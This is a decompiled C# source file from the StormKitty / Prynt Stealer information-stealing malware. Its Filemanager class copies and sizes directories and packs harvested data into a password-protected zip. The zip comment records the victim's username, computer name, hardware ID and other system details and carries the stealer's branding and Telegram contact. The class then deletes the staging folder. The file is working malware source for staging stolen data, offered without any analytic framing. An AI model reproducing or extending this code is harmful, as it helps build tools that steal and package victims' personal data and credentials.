﻿using System;
using System.IO;
using System.Linq;
using System.Text;
using Ionic.Zip;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x02000060 RID: 96
	internal sealed class Filemanager
	{
		// Token: 0x0600015D RID: 349 RVA: 0x0000A284 File Offset: 0x00008484
		public static void RecursiveDelete(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			if (!directoryInfo.Exists)
			{
				return;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			for (int i = 0; i < directories.Length; i++)
			{
				Filemanager.RecursiveDelete(directories[i].FullName);
			}
			directoryInfo.Delete(true);
		}

		// Token: 0x0600015E RID: 350 RVA: 0x0000A2CC File Offset: 0x000084CC
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			if (!Directory.Exists(destFolder))
			{
				Directory.CreateDirectory(destFolder);
			}
			foreach (string text in Directory.GetFiles(sourceFolder))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(destFolder, fileName);
				File.Copy(text, destFileName);
			}
			foreach (string text2 in Directory.GetDirectories(sourceFolder))
			{
				string fileName2 = Path.GetFileName(text2);
				string destFolder2 = Path.Combine(destFolder, fileName2);
				Filemanager.CopyDirectory(text2, destFolder2);
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000A348 File Offset: 0x00008548
		public static long DirectorySize(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => Filemanager.DirectorySize(di.FullName));
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000A3B4 File Offset: 0x000085B4
		public static string CreateArchive(string directory, bool setpassword = true)
		{
			if (Directory.Exists(directory))
			{
				using (ZipFile zipFile = new ZipFile(Encoding.Default))
				{
					zipFile.CompressionLevel = 9;
					zipFile.Comment = string.Concat(new string[]
					{
						"\nPrynt Stealer Developed By @FlatLineStealerUpdated And @youhacker55\nhttp://t.me/officialpryntsoftware\n\n== System Info ==\nDate: ",
						SystemInfo.datenow,
						"\nUsername: ",
						SystemInfo.username,
						"\nCompName: ",
						SystemInfo.compname,
						"\nLanguage: ",
						SystemInfo.culture,
						"\n\n== Hardware ==\nCPU: ",
						SystemInfo.GetCPUName(),
						"\nGPU: ",
						SystemInfo.GetGPUName(),
						"\nRAM: ",
						SystemInfo.GetRamAmount(),
						"\nHWID: ",
						SystemInfo.GetHardwareID(),
						"\nPower: ",
						SystemInfo.GetBattery(),
						"\nScreen: ",
						SystemInfo.ScreenMetrics(),
						"\n"
					});
					if (setpassword)
					{
						zipFile.Password = "@SCARLETTA_OWNER";
					}
					zipFile.AddDirectory(directory);
					zipFile.Save(directory + ".zip");
				}
			}
			Filemanager.RecursiveDelete(directory);
			Console.WriteLine("Archive " + new DirectoryInfo(directory).Name + " compression completed");
			return directory + ".zip";
		}
	}
}
